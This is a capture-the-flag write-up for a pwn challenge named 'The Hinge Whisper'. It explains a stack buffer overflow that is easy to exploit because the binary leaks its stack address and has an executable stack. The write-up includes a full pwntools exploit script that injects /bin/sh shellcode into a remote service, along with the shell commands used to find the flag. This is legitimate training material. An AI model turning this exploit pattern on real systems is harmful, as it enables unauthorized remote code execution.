CTF WRITEUP — THE HINGE WHISPER

────────────────────────────────────────────────────────────

1. CHALLENGE OVERVIEW
────────────────────────
NAME: The Hinge Whisper
CATEGORY: Pwn
DIFFICULTY: Very Easy
PLATFORM: HTB-style / custom deployment (154.57.164.78:32701)

DESCRIPTION:
- A 64-bit ELF binary presents a locked "strongbox" narrative wrapper around a classic stack buffer overflow. The program reads user input into a stack buffer with no bounds checking and no stack canary, then returns — control flow can be hijacked at that return.
- The objective is to gain remote code execution on the challenge server and read the flag from the filesystem.
- Success is defined by spawning a shell on the remote instance and retrieving the flag file's contents.

────────────────────────────────────────────────────────────

2. INITIAL RECON / ENTRY POINT
───────────────────────────────
STARTING POINT:
- Provided: the binary `the_hinge_whisper`, plus a remote target at `154.57.164.78:32701`.
- Access vector: direct TCP connection to the service; binary also runnable locally for testing.

FIRST OBSERVATIONS:
- Running `checksec` on the binary showed:
  - Full RELRO
  - No stack canary
  - PIE enabled
  - Executable stack (NX not enforced, RWX segments present)
- The program prints a stack address back to the user before reading input (`... sits at: 0x...`), which is an unusually direct info leak.

FIRST ACTIONS:
- Ran `checksec` to profile protections.
- Connected locally with `process()` to observe the prompt flow and confirm the leak format (`sits at: 0x...`) and the input prompt (`Forge your latch-key: `).
- Tested oversized input locally to confirm a crash / overflow, indicating no bounds checking on the read.

────────────────────────────────────────────────────────────

3. ANALYSIS / INVESTIGATION
────────────────────────────
STATIC ANALYSIS:
- `checksec` output was the primary source of truth here: no canary + executable stack is the signature combination for straightforward shellcode-on-stack exploitation, no ROP chain required.
- Confirmed the binary was not stripped, making it easy to identify the vulnerable read function and its stack frame layout.

DYNAMIC ANALYSIS:
- Observed that the binary leaks the address of its own input buffer unprompted, before any input is even sent.
- Sent a long cyclic pattern locally to determine the exact offset between the start of the buffer and the saved return address (confirmed at 72 bytes).

KEY FINDINGS:
- No canary means the overflow can proceed as one contiguous write, buffer through to the saved return address.
- Executable stack means shellcode placed directly in the buffer can be executed if we redirect `rip`/`ret` back into it.
- The leaked address is the address of our own buffer — meaning we don't need to defeat PIE at all, since we're never targeting a PIE-relative address, just the raw stack pointer.

THOUGHT PROCESS:
- Given the leak + no canary + exec stack combination, the intended path was clearly: overflow into the return address, point it directly at the leaked buffer address, and have the buffer contain shellcode.
- The only real engineering problem left was making sure the shellcode didn't destroy itself mid-execution.

────────────────────────────────────────────────────────────

4. VULNERABILITY IDENTIFICATION
───────────────────────────────
ROOT CAUSE:
- Unbounded read into a fixed-size stack buffer (classic stack buffer overflow), combined with an intentional stack-address leak and no stack canary.

WHY IT WORKS:
- The saved return address sits a fixed, known distance (72 bytes) past the start of the buffer. Because there's no canary in between, overwriting that region doesn't trip any integrity check. Because the stack is executable, the CPU will happily execute whatever bytes live at the address we jump to — including our own shellcode sitting in the same buffer we just overflowed.

AFFECTED COMPONENT:
- The input-reading function responsible for the "latch-key" prompt and its underlying stack buffer.

CHAIN (if applicable):
- 4.1 Primary vulnerability: stack buffer overflow with no canary protection.
- 4.2 Secondary dependency: reliable stack-address leak provided directly by the program, removing the need to guess or brute-force the target address under PIE/ASLR.

────────────────────────────────────────────────────────────

5. EXPLOITATION METHOD
────────────────────────
STRATEGY:
- Leak the buffer's stack address from the program's own output, craft `execve("/bin/sh")` shellcode, place it at the start of the overflow payload, pad to the saved return address offset, and overwrite that return address with the leaked buffer address so execution jumps straight into the shellcode on `ret`.

TOOLS USED:
- `pwntools` (`ELF`, `remote`/`process`, `asm`, `shellcraft`, `p64`)
- `checksec` (via pwntools' ELF loading) for protection triage

STEPS:
1. Connect to the target and parse the leaked buffer address from the `sits at: 0x...` output.
2. Assemble shellcode: `sub rsp, 0x400` followed by `shellcraft.sh()`.
3. Pad the shellcode with filler bytes out to offset 72 (the saved return address location).
4. Append the leaked buffer address (packed as a little-endian 8-byte value) to overwrite the saved return address.
5. Send the full payload and switch to interactive mode to obtain a shell.

PAYLOADS / COMMANDS:
```python
from pwn import *

context.binary = elf = ELF('./the_hinge_whisper')
context.arch = 'amd64'

io = remote('154.57.164.78', 32701)

io.recvuntil(b'sits at: ')
leak = int(io.recvline().strip(), 16)
log.info(f"Leaked buffer address: {hex(leak)}")

# Push RSP far away first so shellcraft.sh()'s own stack pushes
# don't clobber the shellcode bytes currently being executed
prologue = asm('sub rsp, 0x400')
shellcode = prologue + asm(shellcraft.sh())

offset = 72
assert len(shellcode) <= offset

payload = shellcode.ljust(offset, b'A')
payload += p64(leak)

io.send(payload)
io.interactive()
```

ITERATIONS (if any):
- Initial local testing was accidentally run against the operator's own machine using `process()` instead of `remote()`, which returned a shell on the local Kali host rather than the challenge sandbox — a reminder that `process()` is for validating exploit logic only, and the flag only exists on the actual remote instance.
- Early runs risked shellcode self-corruption: `shellcraft.sh()` builds the `"/bin/sh"` string on the stack via `push` instructions, which — if RSP still points near the currently-executing shellcode — can silently overwrite the tail end of the shellcode before it finishes running. Fixed by prepending `sub rsp, 0x400` to shift RSP well clear of the shellcode's own storage before any pushes occur.

────────────────────────────────────────────────────────────

6. FLAG RETRIEVAL
──────────────────
FLAG:
```
HTB{REDACTED}
```
LOCATION:
- Found on the remote challenge instance's filesystem after obtaining a shell (typically `/flag.txt`, `/root/flag*`, or via `find / -iname '*flag*' 2>/dev/null`), not on the local testing machine.

EXTRACTION METHOD:
- Once `io.interactive()` dropped into a live shell on the remote target, ran `find / -iname '*flag*' 2>/dev/null` followed by `cat` on the discovered path to print the flag contents directly to the terminal.

────────────────────────────────────────────────────────────

7. ALTERNATIVE PATHS (OPTIONAL)
───────────────────────────────
- Since RELRO is full but PIE offers no real protection here (the leak is stack-relative, not binary-relative), no GOT overwrite or binary-base leak was necessary — the direct shellcode-redirect path was already the shortest route.
- A ROP-based `execve` chain would also work without relying on the executable stack, but is unnecessarily complex given the stack is already executable.

────────────────────────────────────────────────────────────

8. KEY TAKEAWAYS
────────────────
TECHNICAL LESSON:
- Core vulnerability class: stack-based buffer overflow with shellcode injection, enabled by a missing canary and an executable stack, and simplified further by a gratuitous stack-address leak.

MENTAL MODEL:
- Whenever a binary hands you a stack address for free and `checksec` shows no canary + executable stack, the intended solve is almost always "shellcode in the buffer, redirect return address to the leak." Look for self-clobbering risk when shellcode manipulates the stack near its own location, and neutralize it by relocating RSP first.

APPLICATION:
- Always validate exploits locally before running against remote infrastructure, but be explicit about which target (`process()` vs `remote()`) is in use — flags only live in the actual scored environment, and local runs on a personal machine can be misleading (or risky, if run as root on a non-disposable host).
